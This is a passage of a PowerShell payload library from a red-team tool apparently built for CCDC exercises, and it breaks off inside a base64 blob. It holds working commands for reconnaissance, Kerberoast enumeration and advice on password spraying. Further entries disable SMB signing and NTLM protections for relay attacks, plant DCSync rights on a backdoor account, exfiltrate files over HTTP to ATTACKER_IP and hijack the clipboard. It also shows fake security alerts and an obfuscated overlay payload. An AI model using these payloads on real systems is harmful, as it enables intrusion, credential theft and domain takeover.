        Cmd   = '$o=@(); $o+="=== HOSTNAME ==="; $o+=hostname; $o+="=== USERS ==="; $o+=cmd /c "net user"; $o+="=== ADMINS ==="; $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o+="=== CONNECTIONS ==="; $o+=netstat -an; $o+="=== ARP ==="; $o+=arp -a; $o+="=== SERVICES ==="; $o+=cmd /c "sc query state= all"; $o | Out-File C:\ProgramData\r.txt -Force'
        Notes = 'Kitchen-sink recon — writes everything to one file for easy exfil'
    }

    'RECON-002' = @{
        Desc  = 'Domain enumeration (if domain-joined)'
        Cmd   = 'try{$d=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); $o=@("Domain: $($d.Name)","DCs: $($d.DomainControllers|ForEach-Object{$_.Name})","Forest: $($d.Forest.Name)"); $o+="=== Domain Admins ==="; $o+=cmd /c "net group ""Domain Admins"" /domain 2>nul"; $o|Out-File C:\ProgramData\d.txt -Force}catch{''Not domain-joined''|Out-File C:\ProgramData\d.txt -Force}'
        Notes = 'Gracefully handles non-domain machines. Outputs domain name, DCs, forest, and domain admin members.'
    }

    'RECON-003' = @{
        Desc  = 'Find interesting files (passwords, configs, keys)'
        Cmd   = '@(''*.config'',''*.xml'',''*.ini'',''*.txt'',''*.ps1'',''*.bat'',''*.cmd'') | ForEach-Object { Get-ChildItem -Path C:\Users -Recurse -Filter $_ -EA 0 | Where-Object { $_.Length -lt 1MB -and $_.FullName -match ''(pass|cred|key|token|secret|config|backup)'' } | Select-Object FullName,Length,LastWriteTime } | Out-File C:\ProgramData\f.txt -Force'
        Notes = 'Searches user directories for files with sensitive-sounding names and extensions'
    }

    'RECON-004' = @{
        Desc  = 'Enumerate scheduled tasks (find blue team monitoring)'
        Cmd   = 'Get-ScheduledTask | Where-Object { $_.State -ne ''Disabled'' } | Select-Object TaskName,TaskPath,State,@{N=''Actions'';E={$_.Actions.Execute}} | Format-Table -AutoSize | Out-String | Out-File C:\ProgramData\t.txt -Force'
        Notes = 'Lists all active scheduled tasks — helps identify blue team monitoring, AV scans, and other defenses'
    }

    'RECON-005' = @{
        Desc  = 'Network share discovery + accessible file listing'
        Cmd   = '$s=Get-SmbShare -EA 0 | Where-Object { $_.Name -notmatch ''[\$]$'' }; $o=@("=== LOCAL SHARES ==="); $s|ForEach-Object{$o+="$($_.Name) → $($_.Path)"}; $o+="=== NET VIEW ==="; $o+=cmd /c "net view 2>nul"; $o|Out-File C:\ProgramData\shares.txt -Force'
        Notes = 'Enumerates local SMB shares (excluding admin$, c$, etc.) and attempts net view for nearby hosts'
    }

    'RECON-006' = @{
        Desc  = 'Privilege escalation surface: unquoted service paths + token privileges + writable system dirs'
        Cmd   = '$o=@("=== UNQUOTED SERVICE PATHS ==="); Get-WmiObject Win32_Service -EA 0 | Where-Object { $_.PathName -match '' '' -and $_.PathName -notmatch ''^"'' } | ForEach-Object { $o += "$($_.Name): $($_.PathName)" }; $o += "=== TOKEN PRIVILEGES ==="; $o += cmd /c "whoami /priv 2>nul"; $o += "=== WRITABLE DIRS ==="; @(''C:\Windows\System32'',''C:\Windows\Temp'',''C:\ProgramData'',''C:\Windows'') | ForEach-Object { try { [IO.File]::Create("$_\.tmp_test").Close(); Remove-Item "$_\.tmp_test" -EA 0; $o += "WRITABLE: $_" } catch {} }; $o | Out-File C:\ProgramData\privesc.txt -Force'
        Notes = 'Automated privesc triage: finds unquoted service binary paths (plant a binary in the gap), dumps token privileges (look for SeImpersonatePrivilege for potato attacks), tests directory writability. Three common manual checks in one automated sweep.'
    }

    'RECON-007' = @{
        Desc  = 'Enumerate Kerberoastable accounts (SPNs on user objects) and AS-REP roastable accounts'
        Cmd   = 'try{$o=@("=== KERBEROASTABLE (SPN on user) ==="); Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} -Properties ServicePrincipalName,PasswordLastSet -EA 0 | ForEach-Object{"$($_.SamAccountName) | SPN: $($_.ServicePrincipalName) | PwdLastSet: $($_.PasswordLastSet)"}|ForEach-Object{$o+=$_}; $o+="`n=== AS-REP ROASTABLE (no preauth) ==="; Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} -EA 0 | ForEach-Object{$o+=$_.SamAccountName}; $o|Out-File C:\ProgramData\roast.txt -Force}catch{"Not domain-joined or no AD module"|Out-File C:\ProgramData\roast.txt -Force}'
        Notes = 'Kerberoastable accounts: request their TGS tickets and crack offline (no special privs needed). AS-REP roastable: request their encrypted AS-REP without knowing their password and crack offline. Both are common misconfigs in WRCCDC domain builds. Crack on Kali with hashcat or john. SYSTEM context on domain member has the required AD read access.'
    }

    'RECON-008' = @{
        Desc  = 'Dump domain password policy, fine-grained policies, and account lockout settings'
        Cmd   = 'try{$d=Get-ADDomain -EA 0; $p=Get-ADDefaultDomainPasswordPolicy -EA 0; $o=@("=== DOMAIN PASSWORD POLICY ===","MinLength: $($p.MinPasswordLength)","MaxAge: $($p.MaxPasswordAge)","LockoutThreshold: $($p.LockoutThreshold)","LockoutDuration: $($p.LockoutDuration)","LockoutObservationWindow: $($p.LockoutObservationWindow)","ComplexityEnabled: $($p.ComplexityEnabled)"); $o+="`n=== FINE-GRAINED POLICIES ==="; Get-ADFineGrainedPasswordPolicy -Filter * -EA 0 | ForEach-Object{"$($_.Name): MinLen=$($_.MinPasswordLength) LockoutThreshold=$($_.LockoutThreshold)"} | ForEach-Object{$o+=$_}; $o|Out-File C:\ProgramData\policy.txt -Force}catch{"Not domain-joined"|Out-File C:\ProgramData\policy.txt -Force}'
        Notes = 'Critical intel: if lockout threshold is 3-5 and there is no fine-grained policy protecting admin accounts, spray carefully. If LockoutThreshold is 0 (disabled), spray freely. Lockout duration tells you how long to wait between sprays. Export before any credential spraying.'
    }

    # ════════════════════════════════════════════════════════════
    # 🌐 LATERAL MOVEMENT PREPARATION
    # ════════════════════════════════════════════════════════════

    'LAT-001' = @{
        Desc  = 'Enable WinRM for lateral movement'
        Cmd   = 'cmd /c "winrm quickconfig -quiet & winrm set winrm/config/service @{AllowUnencrypted=""true""} & winrm set winrm/config/service/auth @{Basic=""true""}"'
        Notes = 'Enables WinRM with relaxed auth — allows remote PS sessions from Kali or other compromised hosts'
    }

    'LAT-002' = @{
        Desc  = 'Enable PSRemoting + set trusted hosts to any'
        Cmd   = 'Enable-PSRemoting -Force -SkipNetworkProfileCheck; Set-Item WSMan:\localhost\Client\TrustedHosts -Value ''*'' -Force'
        Notes = 'PowerShell remoting with wildcard trusted hosts — enables Enter-PSSession to any target'
    }

    'LAT-003' = @{
        Desc  = 'Enable WMI remote access (for wmic lateral movement)'
        Cmd   = 'cmd /c "netsh advfirewall firewall set rule group=""Windows Management Instrumentation (WMI)"" new enable=yes"'
        Notes = 'Opens WMI firewall rules — enables wmic /node:TARGET process call create from attack box'
    }

    'LAT-004' = @{
        Desc  = 'SMB share creation for file staging'
        Cmd   = 'cmd /c "net share RedTeam=C:\ProgramData /grant:Everyone,FULL /unlimited"'
        Notes = 'Creates accessible share on compromised host — useful as staging point for spreading to other machines'
    }

    'LAT-005' = @{
        Desc  = 'Disable SMB signing requirement (enables NTLM relay attacks via Responder/ntlmrelayx)'
        Cmd   = 'Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters'' -Name RequireSecuritySignature -Value 0 -Type DWord -Force; Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'' -Name RequireSecuritySignature -Value 0 -Type DWord -Force; Set-ItemProperty -Path ''HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'' -Name EnableSecuritySignature -Value 0 -Type DWord -Force'
        Notes = 'Disables SMB signing on both client and server. Enables Responder + ntlmrelayx relay attacks from Kali: sudo responder -I eth0 -wf && ntlmrelayx.py -tf targets.txt -smb2support. Highly effective in domain environments where signing is not GPO-enforced.'
    }

    'LAT-006' = @{
        Desc  = 'Disable Extended Protection for Authentication (EPA) + enable NTLM downgrade (enables relay attacks)'
        Cmd   = '$ep="HKLM:\SYSTEM\CurrentControlSet\Control\LSA"; Set-ItemProperty $ep -Name LmCompatibilityLevel -Value 2 -Type DWord -Force -EA 0; $spn="$ep\MSV1_0"; if(!(Test-Path $spn)){New-Item $spn -Force|Out-Null}; Set-ItemProperty $spn -Name NTLMMinClientSec -Value 0 -Type DWord -Force; Set-ItemProperty $spn -Name NTLMMinServerSec -Value 0 -Type DWord -Force; cmd /c "reg add ""HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters"" /v AuthForwardServerList /t REG_MULTI_SZ /d * /f 2>nul"'
        Notes = 'Reduces NTLMv2 minimum security requirements and disables EPA/channel binding for WebDAV auth forwarding. Enables ntlmrelayx attacks from Kali: ntlmrelayx.py -tf targets.txt -smb2support -socks. Combined with LAT-005 (SMB signing disabled) this makes relay trivial. Run Responder: sudo responder -I eth0 -wf.'
    }

    'LAT-007' = @{
        Desc  = 'Grant DCSync rights to backdoor account on domain root (requires Domain Admin context on DC)'
        Cmd   = 'try{$u="svcUpdate";$sid=(Get-ADUser $u -EA 0).SID; if($sid){$dn=(Get-ADDomain).DistinguishedName; $acl=Get-Acl "AD:$dn"; $guids=@("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","1131f6ab-9c07-11d1-f79f-00c04fc2dcd2","89e95b76-444d-4c62-991a-0facbeda640c"); $guids|ForEach-Object{$r=New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid,[System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,[System.Security.AccessControl.AccessControlType]::Allow,[guid]$_,[System.DirectoryServices.ActiveDirectorySecurityInheritance]::None); $acl.AddAccessRule($r)}; Set-Acl "AD:$dn" $acl; "DCSync rights granted to $u"|Out-File C:\ProgramData\dcsync.txt}}catch{"Failed: $_"|Out-File C:\ProgramData\dcsync.txt}'
        Notes = 'Grants DS-Replication-Get-Changes, DS-Replication-Get-Changes-All, and DS-Replication-Get-Changes-In-Filtered-Set rights to svcUpdate. After this fires, from Kali: secretsdump.py DOMAIN/svcUpdate:PASSWORD@DC-IP -just-dc. Dumps all domain hashes including KRBTGT for Golden Ticket. Deploy on DC, requires Domain Admin context at execution time (SYSTEM on DC = Domain Admin).'
    }

    # ════════════════════════════════════════════════════════════
    # 📁 DATA EXFILTRATION
    # ════════════════════════════════════════════════════════════

    'EXFIL-001' = @{
        Desc  = 'Compress and stage user data for exfil'
        Cmd   = 'Compress-Archive -Path C:\Users\*\Documents\*,C:\Users\*\Desktop\* -DestinationPath C:\ProgramData\backup.zip -Force -CompressionLevel Fastest'
        Notes = 'Zips all user Documents and Desktop files — transfer via SMB share or download cradle reverse. SYSTEM CONTEXT CAVEAT: SYSTEM can access most user profile folders but may be blocked by per-user ACLs on Server 2019+. Test access first.'
    }

    'EXFIL-002' = @{
        Desc  = 'HTTP exfil of file to attacker (curl-style)'
        Cmd   = '$f=[Convert]::ToBase64String([IO.File]::ReadAllBytes(''C:\ProgramData\s.dat'')); (New-Object Net.WebClient).UploadString(''http://ATTACKER_IP:8080/exfil'', $f)'
        Notes = 'Replace ATTACKER_IP — base64 encodes file and POSTs to attacker. Catch with: nc -lvnp 8080'
    }

    'EXFIL-003' = @{
        Desc  = 'ICMP exfil (slow but evades firewall rules that only watch TCP/UDP)'
        Cmd   = '$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((hostname)+"_"+(whoami))); $chunks=$d-split"(.{32})"|Where-Object{$_}; $chunks|ForEach-Object{cmd /c "ping -n 1 -l 1 ATTACKER_IP" 2>$null}'
        Notes = 'Replace ATTACKER_IP — uses ICMP pings to signal. More of a beacon than true data exfil.'
    }

    # ════════════════════════════════════════════════════════════
    # 🎮 IMPACT / FUN (CCDC Flair)
    # ════════════════════════════════════════════════════════════

    'FUN-001' = @{
        Desc  = 'Change desktop wallpaper (download from attacker)'
        Cmd   = '$w=New-Object Net.WebClient;$w.DownloadFile(''http://ATTACKER_IP:8080/wallpaper.jpg'',"$env:APPDATA\wp.jpg");Set-ItemProperty ''HKCU:\Control Panel\Desktop'' -Name Wallpaper -Value "$env:APPDATA\wp.jpg";rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,true'
        Notes = 'Replace ATTACKER_IP — host a fun image on your web server. Wallpaper updates immediately. SYSTEM CONTEXT WARNING: $env:APPDATA and HKCU resolve to SYSTEM profile from Task Scheduler. Wallpaper change will not affect any interactive user. Use interactive session only.'
    }

    'FUN-002' = @{
        Desc  = 'Text-to-speech announcement'
        Cmd   = 'Add-Type -AssemblyName System.Speech;(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''Attention. Your system has been visited by the red team. Have a wonderful day.'')'
        Notes = 'Plays TTS audio through system speakers — guaranteed to make blue team do a double-take. SYSTEM CONTEXT WARNING: Session 0 has no audio device. Silent from Task Scheduler. Use interactive session only.'
    }

    'FUN-003' = @{
        Desc  = 'Notepad popup with message'
        Cmd   = '"''Red Team Was Here - CCDC 2026 <3''" | Out-File "$env:TEMP\rt.txt" -Force; Start-Process notepad "$env:TEMP\rt.txt"'
        Notes = 'Simple visible indicator — opens notepad with a message. Good for proving access. SYSTEM CONTEXT WARNING: Notepad opens in Session 0 (invisible) from Task Scheduler. No user will see it. Use interactive session only.'
    }

    'FUN-004' = @{
        Desc  = 'Invert mouse buttons (subtle chaos)'
        Cmd   = '$sig=''[DllImport("user32.dll")] public static extern bool SwapMouseButton(bool swap);''; $t=Add-Type -MemberDefinition $sig -Name ''WinAPI'' -Namespace ''Mouse'' -PassThru; $t::SwapMouseButton($true)'
        Notes = 'P/Invoke to swap left/right mouse buttons. Subtle enough to waste time before blue team realizes. SYSTEM CONTEXT WARNING: Runs in Session 0 from Task Scheduler — affects SYSTEM desktop, not interactive user mouse. Use interactive session only.'
    }

    'FUN-005' = @{
        Desc  = 'Rotate screen 180 degrees (requires display driver support)'
        Cmd   = 'cmd /c "reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Video"" /v Rotation /t REG_DWORD /d 2 /f 2>nul"; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { Write-Host "Screen rotated — restart explorer.exe to apply" }'
        Notes = 'May not work on all display drivers. The registry method requires a display restart to take effect. SYSTEM CONTEXT WARNING: Session 0 has no display. No effect from Task Scheduler. Use interactive session only.'
    }

    'FUN-006' = @{
        Desc  = 'Continuous random beep (background annoyance)'
        Cmd   = 'while($true){[Console]::Beep((Get-Random -Min 200 -Max 2000),(Get-Random -Min 100 -Max 500));Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 30000)}'
        Notes = 'Random frequency beeps at random intervals — maddening but harmless. Runs until process killed. SYSTEM CONTEXT WARNING: Session 0 has no audio device. Silent from Task Scheduler. Use interactive session only.'
    }

    'FUN-007' = @{
        Desc  = 'OIIA cat tribute — spinning ASCII cat with live recon (hostname/user/privs/admins) in a visible console window for 30 seconds'
        Cmd   = '$sc=''$fr=@(@("  /\_/\ ","  (^o.o^)","   > ^ < "),@("  /\_/\ ","  ( -.- )","   > ^ < "),@("  /\_/\ ","  (~.-~) ","   < ^ < "));$adm=try{(Get-LocalGroupMember Administrators -EA 0).Count}catch{0};$pv=@{$true="ELEVATED";$false="Standard"}[([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)];$e=[DateTime]::Now.AddSeconds(30);$host.UI.RawUI.BackgroundColor="Black";Clear-Host;while([DateTime]::Now -lt $e){foreach($g in $fr){if([DateTime]::Now -ge $e){break};Clear-Host;Write-Host "`n  ~~ OIIA OIIA OIIA ~~" -F Magenta;$g|%{Write-Host "  $_" -F Cyan};Write-Host ("  Host:{0}  User:{1}  Priv:{2}  Admins:{3}  {4}" -f (hostname),(whoami),$pv,$adm,(Get-Date -f "HH:mm:ss")) -F Yellow;Start-Sleep -ms 220}};Clear-Host'';$f="$env:ProgramData\oiia_diag.ps1";$sc|Out-File $f -Force;Start-Process powershell "-NoP -File `"$f`"" -WindowStyle Normal'
        Notes = 'Tribute to the OIIA spinning cat meme. Spawns a visible PowerShell window showing spinning ASCII cat + live proof-of-compromise info for 30 seconds, then exits. SYSTEM CONTEXT WARNING: Use -Persist registry for guaranteed user-session delivery. Task Scheduler / Session 0 spawns the window invisibly.'
    }

    'FUN-008' = @{
        Desc  = 'OIIA desktop graffiti — drops OIIA_RED_TEAM_WAS_HERE.txt with ASCII cat + live recon to Desktop, Public Desktop, and Temp'
        Cmd   = '$adm=try{(Get-LocalGroupMember Administrators -EA 0).Count}catch{0};$pv=@{$true="ELEVATED";$false="Standard"}[([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)];$art="  /\_/\    oiia oiia oiia`n  (o.o )   ~~~ OIIA RED TEAM ~~~`n  > ^ <`n`n  PROOF OF COMPROMISE`n  ==================`n  Host: $(hostname)`n  User: $(whoami)`n  Priv: $pv`n  Admins: $adm`n  Date: $([DateTime]::Now)`n`n  You have been visited by Apparition.`n  oiia oiia oiia oiia oiia";foreach($p in @("$env:PUBLIC\Desktop","$env:USERPROFILE\Desktop","$env:TEMP")){$art|Out-File "$p\OIIA_RED_TEAM_WAS_HERE.txt" -Force -EA 0}'
        Notes = 'Drops a persistent text file with OIIA ASCII art + hostname/user/privilege proof-of-compromise to Desktop, Public Desktop, and Temp. File named OIIA_RED_TEAM_WAS_HERE.txt — visible in File Explorer on next logon. SYSTEM OK — works from any session including Task Scheduler Session 0. No windows required.'
    }

    # ════════════════════════════════════════════════════════════
    # 🃏 MEME / ENTERTAINMENT
    # ════════════════════════════════════════════════════════════
    # Payloads marked SYSTEM OK work from Task Scheduler (Session 0).
    # Payloads marked INTERACTIVE ONLY require a visible user desktop —
    # use -Persist registry to fire them in the user logon session.
    # ════════════════════════════════════════════════════════════

    'MEME-001' = @{
        Desc  = 'Fake BSOD — WinForms error dialog styled as a crash screen'
        Cmd   = 'Add-Type -AN System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(":( Your PC ran into a problem and needs to restart.`n`nSTOP CODE: CRITICAL_RED_TEAM_PROCESS`n`nWhat failed: apparition.sys`n`nFor more information visit: aka.ms/windiag", "A problem has occurred", 0, 16)'
        Notes = 'MessageBoxIcon=16 (Error icon). Pops a scary BSOD-styled modal that must be dismissed. Harmless but alarming enough to cause panic. INTERACTIVE ONLY — use -Persist registry for user logon delivery.'
    }

    'MEME-002' = @{
        Desc  = 'Wall of Notepads — 10 cascading Notepad windows with red team message'
        Cmd   = '"Red Team Was Here — Apparition Delivery System v2.4`nCCDC 2026 | Execution without presence" | Out-File "$env:TEMP\rt.txt" -Force; 1..10 | ForEach-Object { Start-Process notepad "$env:TEMP\rt.txt"; Start-Sleep -Milliseconds 300 }'
        Notes = 'Opens 10 cascading Notepad windows with your message — chaotic and unmissable at logon. INTERACTIVE ONLY — use -Persist registry. VM-Validated CLEAN (2026-02-19, M4 test).'
    }

    'MEME-003' = @{
        Desc  = 'Text-to-speech announcement through system speakers at full volume'
        Cmd   = 'Add-Type -AN System.Speech; $s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Rate=-2; $s.Volume=100; $s.Speak("Attention. Your system has been visited by the red team. Apparition Delivery System version 2.4. Have a wonderful day.")'
        Notes = 'TTS at full volume with slow rate for maximum effect. INTERACTIVE ONLY — Session 0 has no audio device. Use -Persist registry for delivery at next user logon.'
    }

    'MEME-004' = @{
        Desc  = 'Matrix rain — green cascading ASCII characters in a console window for 2 minutes'
        Cmd   = '$f="$env:TEMP\matrix.ps1"; ''$host.UI.RawUI.BackgroundColor="Black";$host.UI.RawUI.ForegroundColor="Green";Clear-Host;$ch=@("0","1","M","A","T","R","I","X","$","#","%","@");$w=$host.UI.RawUI.WindowSize.Width;$h=$host.UI.RawUI.WindowSize.Height;$e=(Get-Date).AddMinutes(2);while((Get-Date)-lt $e){$p=New-Object System.Management.Automation.Host.Coordinates (Get-Random -Max $w),(Get-Random -Max $h);$host.UI.RawUI.CursorPosition=$p;Write-Host $ch[(Get-Random -Max $ch.Count)] -NoNewline;Start-Sleep -ms 15}'' | Out-File $f -Force; Start-Process powershell "-NoP -File `"$f`"" -WindowStyle Normal'
        Notes = 'Spawns a visible black+green console with Matrix rain animation for 2 minutes then exits cleanly. SYSTEM OK — Task Scheduler spawns a new visible console window. VM-Validated CLEAN (2026-02-19, M3 test).'
    }

    'MEME-005' = @{
        Desc  = 'Caps Lock / Num Lock / Scroll Lock keyboard LED disco for 60 seconds'
        Cmd   = '$w=New-Object -ComObject WScript.Shell; $e=(Get-Date).AddSeconds(60); while((Get-Date)-lt $e){ $w.SendKeys("{CAPSLOCK}"); $w.SendKeys("{NUMLOCK}"); $w.SendKeys("{SCROLLLOCK}"); Start-Sleep -Milliseconds 250 }'
        Notes = 'Rapidly blinks all three keyboard indicator LEDs in sequence. Physical LEDs respond even from SYSTEM context. Time-limited to 60 seconds. SYSTEM OK. VM-Validated CLEAN (2026-02-19, M2 test).'
    }

    'MEME-006' = @{
        Desc  = 'Persistent clipboard hijack — replaces clipboard every 30 seconds with red team message'
        Cmd   = 'Add-Type -AN PresentationCore; while($true){ [Windows.Clipboard]::SetText("Never gonna give you up — Red Team was here — ADS v2.4"); Start-Sleep -Seconds 30 }'
        Notes = 'Every copy the blue team does gets overwritten 30 seconds later. SYSTEM OK — clipboard is shared across sessions. Runs until process is killed or task is removed. VM-Validated CLEAN (2026-02-19, M1 test).'
    }

    'MEME-007' = @{
        Desc  = 'Five sequential fake "Windows Security" warning popups'
        Cmd   = 'Add-Type -AN System.Windows.Forms; $m=@("Critical security event detected on this system.","Unauthorized access attempt has been logged.","Your credentials may have been compromised.","Red Team has accessed this machine.","Apparition Delivery System says hello."); 1..5 | ForEach-Object { [System.Windows.Forms.MessageBox]::Show($m[(Get-Random -Max 5)], "Windows Security", 0, 48); Start-Sleep -Milliseconds 800 }'
        Notes = 'Five sequential WinForms MessageBox popups (icon=48, Warning) with fake security alert messages. Each blocks until dismissed. INTERACTIVE ONLY — use -Persist registry.'
    }

    'MEME-008' = @{
        Desc  = 'OIIA spinning ASCII cat + live proof-of-compromise printout (30 second visible console)'
        Cmd   = '$f="$env:TEMP\oiia.ps1"; ''$fr=@("(=^._.^=)","(=^._.^)=","(^._.^=)=","=(^._.^)="); $e=(Get-Date).AddSeconds(30); $i=0; $host.UI.RawUI.BackgroundColor="Black"; Clear-Host; while((Get-Date)-lt $e){[Console]::SetCursorPosition(0,0); Write-Host " oiia oiia oiia oiia oiia" -F Magenta; Write-Host " $($fr[$i%4])" -F Cyan; Write-Host " RED TEAM WAS HERE -- ADS v2.4" -F Red; Write-Host " Host:$(hostname) User:$(whoami) Time:$(Get-Date -f HH:mm:ss)" -F Yellow; $i++; Start-Sleep -ms 250}; Write-Host "`n PROOF OF COMPROMISE" -F Green; Write-Host " ====================" -F Green; cmd /c "whoami /groups 2>nul" | Select-Object -First 8'' | Out-File $f -Force; Start-Process powershell "-NoP -File `"$f`"" -WindowStyle Normal'
        Notes = 'Spawns a visible black console: spinning OIIA cat animation for 30 sec, then prints group memberships as proof-of-compromise. SYSTEM OK (spawns a new console). For guaranteed user-session visibility use -Persist registry.'
    }

    'MEME-009' = @{
        Desc  = 'OIIA desktop graffiti — drops OIIA_RED_TEAM_WAS_HERE.txt to Public Desktop + Temp'
        Cmd   = '$art="  /\_/\    oiia oiia oiia`n  (o.o )   ~~~ RED TEAM WAS HERE ~~~`n  > ^ <`n`nProof of Compromise`n==================`nHost : $(hostname)`nUser : $(whoami)`nTime : $(Get-Date -f ""yyyy-MM-dd HH:mm"")"; @("$env:PUBLIC\Desktop","$env:USERPROFILE\Desktop","$env:TEMP") | ForEach-Object { $art | Out-File "$_\OIIA_RED_TEAM_WAS_HERE.txt" -Force -EA 0 }'
        Notes = 'Drops a persistent OIIA ASCII art + hostname/user/time proof-of-compromise file. SYSTEM OK — no visible window or user session required. File appears in File Explorer on next logon. Persists until manually removed.'
    }

    # ════════════════════════════════════════════════════════════
    # 🃏 MEME / ENTERTAINMENT (continued — GDI WinForms payloads)
    # All new entries (MEME-010 through MEME-016) are INTERACTIVE ONLY.
    # Use -Persist registry for guaranteed user-session delivery.
    # All have Ctrl+Shift+Q kill switch (except MEME-013 and MEME-015
    # which have no window; they take effect immediately and persist
    # until logoff or explicit restore call).
    # ════════════════════════════════════════════════════════════

    'MEME-010' = @{
        Desc  = 'Washing Machine — captures desktop screenshot, overlays it fullscreen and spins it at 30fps (~3 deg/frame). Hidden from Alt-Tab. Ctrl+Shift+Q to kill.'
        Cmd   = '$_f="$env:TEMP\meme010_spin.ps1";[IO.File]::WriteAllText($_f,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3JtcwpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiRjb2RlID0gQCIKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRHJhd2luZzsKdXNpbmcgU3lzdGVtLkRyYXdpbmcuRHJhd2luZzJEOwp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwpuYW1lc3BhY2UgV2FzaGluZ01hY2hpbmUgewogICAgcHVibGljIGNsYXNzIFNwaW5Gb3JtIDogRm9ybSB7CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0V2luZG93UG9zKEludFB0ciBoV25kLCBJbnRQdHIgaFduZEluc2VydEFmdGVyLCBpbnQgWCwgaW50IFksIGludCBjeCwgaW50IGN5LCB1aW50IHVGbGFncyk7CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGludCBTZXRXaW5kb3dMb25nKEludFB0ciBoV25kLCBpbnQgbkluZGV4LCBpbnQgZHdOZXdMb25nKTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildIHN0YXRpYyBleHRlcm4gaW50IEdldFdpbmRvd0xvbmcoSW50UHRyIGhXbmQsIGludCBuSW5kZXgpOwogICAgICAgIHN0YXRpYyByZWFkb25seSBJbnRQdHIgSFdORF9UT1BNT1NUID0gbmV3IEludFB0cigtMSk7CiAgICAgICAgY29uc3QgaW50IEdXTF9FWFNUWUxFID0gLTIwOyBjb25zdCBpbnQgV1NfRVhfVE9PTFdJTkRPVyA9IDB4MDAwMDAwODA7CiAgICAgICAgcHJpdmF0ZSBUaW1lciBzcGluVGltZXI7IHByaXZhdGUgQml0bWFwIHNjcmVlbkNhcDsKICAgICAgICBwcml2YXRlIGZsb2F0IGN1cnJlbnRBbmdsZSA9IDBmOyBwcml2YXRlIGZsb2F0IHNwaW5TcGVlZCA9IDNmOwogICAgICAgIHB1YmxpYyBTcGluRm9ybSgpIHsKICAgICAgICAgICAgdGhpcy5Gb3JtQm9yZGVyU3R5bGUgPSBGb3JtQm9yZGVyU3R5bGUuTm9uZTsgdGhpcy5XaW5kb3dTdGF0ZSA9IEZvcm1XaW5kb3dTdGF0ZS5Ob3JtYWw7CiAgICAgICAgICAgIHRoaXMuU3RhcnRQb3NpdGlvbiA9IEZvcm1TdGFydFBvc2l0aW9uLk1hbnVhbDsgdGhpcy5TaG93SW5UYXNrYmFyID0gZmFsc2U7CiAgICAgICAgICAgIHRoaXMuRG91YmxlQnVmZmVyZWQgPSB0cnVlOyB0aGlzLlRvcE1vc3QgPSB0cnVlOyB0aGlzLkN1cnNvciA9IEN1cnNvcnMuRGVmYXVsdDsKICAgICAgICAgICAgUmVjdGFuZ2xlIHRvdGFsID0gUmVjdGFuZ2xlLkVtcHR5OwogICAgICAgICAgICBmb3JlYWNoIChTY3JlZW4gcyBpbiBTY3JlZW4uQWxsU2NyZWVucykgdG90YWwgPSBSZWN0YW5nbGUuVW5pb24odG90YWwsIHMuQm91bmRzKTsKICAgICAgICAgICAgdGhpcy5Cb3VuZHMgPSB0b3RhbDsKICAgICAgICAgICAgc2NyZWVuQ2FwID0gbmV3IEJpdG1hcCh0b3RhbC5XaWR0aCwgdG90YWwuSGVpZ2h0KTsKICAgICAgICAgICAgdXNpbmcgKEdyYXBoaWNzIGcgPSBHcmFwaGljcy5Gcm9tSW1hZ2Uoc2NyZWVuQ2FwKSkgZy5Db3B5RnJvbVNjcmVlbih0b3RhbC5Mb2NhdGlvbiwgUG9pbnQuRW1wdHksIHRvdGFsLlNpemUpOwogICAgICAgICAgICBpbnQgZXhTdHlsZSA9IEdldFdpbmRvd0xvbmcodGhpcy5IYW5kbGUsIEdXTF9FWFNUWUxFKTsKICAgICAgICAgICAgU2V0V2luZG93TG9uZyh0aGlzLkhhbmRsZSwgR1dMX0VYU1RZTEUsIGV4U3R5bGUgfCBXU19FWF9UT09MV0lORE9XKTsKICAgICAgICAgICAgU2V0V2luZG93UG9zKHRoaXMuSGFuZGxlLCBIV05EX1RPUE1PU1QsIDAsIDAsIDAsIDAsIDB4MDAwMSB8IDB4MDAwMik7CiAgICAgICAgICAgIHNwaW5UaW1lciA9IG5ldyBUaW1lcigpOyBzcGluVGltZXIuSW50ZXJ2YWwgPSAzMzsKICAgICAgICAgICAgc3BpblRpbWVyLlRpY2sgKz0gKHMsIGUpID0+IHsgY3VycmVudEFuZ2xlID0gKGN1cnJlbnRBbmdsZSArIHNwaW5